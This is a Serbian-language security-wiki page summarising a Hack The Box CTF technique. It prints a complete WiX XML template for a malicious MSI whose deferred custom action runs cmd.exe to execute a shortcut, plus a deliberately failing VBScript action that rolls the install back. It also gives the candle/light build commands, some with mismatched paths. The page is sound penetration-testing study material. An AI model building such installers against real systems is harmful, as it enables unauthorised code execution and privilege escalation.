# Kreiranje Malicioznog MSI-ja i Dobijanje Root-a

{{#include ../../banners/hacktricks-training.md}}

Kreiranje MSI instalera biće obavljeno pomoću wixtools-a, tačnije koristiće se [wixtools](http://wixtoolset.org). Vredi napomenuti da su isprobani alternativni MSI builderi, ali u ovom konkretnom slučaju nisu bili uspešni.<sup>[[1]](#references)</sup>

Za sveobuhvatno razumevanje primera korišćenja wix MSI-ja, preporučljivo je pogledati [ovu stranicu](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Ovde možete pronaći različite primere koji demonstriraju korišćenje wix MSI-ja.<sup>[[2]](#references)</sup>

Cilj je generisati MSI koji će izvršiti lnk fajl. Da bi se to postiglo, mogao bi se koristiti sledeći XML kod ([xml sa ove stranice](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Važno je napomenuti da element Package sadrži atribute kao što su InstallerVersion i Compressed, koji određuju verziju instalera i označavaju da li je paket kompresovan ili ne.

Proces kreiranja uključuje korišćenje alata candle.exe iz wixtools-a za generisanje wixobject-a iz msi.xml. Treba izvršiti sledeću komandu:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Pored toga, vredi napomenuti da je u objavi obezbeđena slika koja prikazuje komandu i njen izlaz. Možete je koristiti kao vizuelni prikaz.<sup>[[1]](#references)</sup>

Takođe, light.exe, još jedan alat iz wixtools, koristiće se za kreiranje MSI datoteke iz wixobject-a. Komanda koju treba izvršiti je sledeća:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Slično prethodnoj komandi, u objavi je uključena slika koja prikazuje komandu i njen izlaz.<sup>[[1]](#references)</sup>

Imajte na umu da, iako ovaj sažetak ima za cilj da pruži korisne informacije, preporučuje se da pogledate originalnu objavu radi detaljnijih informacija i preciznih uputstava.<sup>[[1]](#references)</sup>

## Reference

- [1] [Hack The Box - Ethereal: Kreiranje zlonamernog msi paketa i dobijanje root pristupa - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Kratak uvod: Kreiranje MSI instalera pomoću WiX-a - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (pogledajte i [wixtools](http://wixtoolset.org))

{{#include ../../banners/hacktricks-training.md}}
